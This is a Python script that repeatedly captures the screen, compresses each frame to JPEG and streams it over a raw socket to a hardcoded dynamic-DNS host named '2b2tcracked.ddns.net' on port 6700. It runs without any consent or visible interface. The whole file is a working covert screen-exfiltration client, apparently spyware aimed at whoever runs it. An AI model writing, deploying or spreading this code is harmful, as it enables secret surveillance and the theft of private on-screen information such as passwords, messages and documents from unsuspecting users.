import socket
import cv2
import numpy as np
import pyautogui
import struct
import threading
import time

def capture_screen():
    """Capture the screen and return it as a frame."""
    screen = pyautogui.screenshot()
    frame = np.array(screen)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return frame

def send_screenshot(client_socket):
    while True:
        try:
            # Capture the screen
            frame = capture_screen()

            # Encode the frame as JPEG
            _, img_encoded = cv2.imencode('.jpg', frame)
            data = img_encoded.tobytes()

            # Send the size of the data first
            client_socket.sendall(struct.pack("L", len(data)))

            # Send the actual data
            client_socket.sendall(data)
            
            # Wait a bit before sending the next frame
            time.sleep(0.1)
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            break

def main():
    SERVER_IP = '2b2tcracked.ddns.net'  # Replace with the server's IP address
    SERVER_PORT = 6700

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        send_screenshot(client_socket)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    threading.Thread(target=main).start()
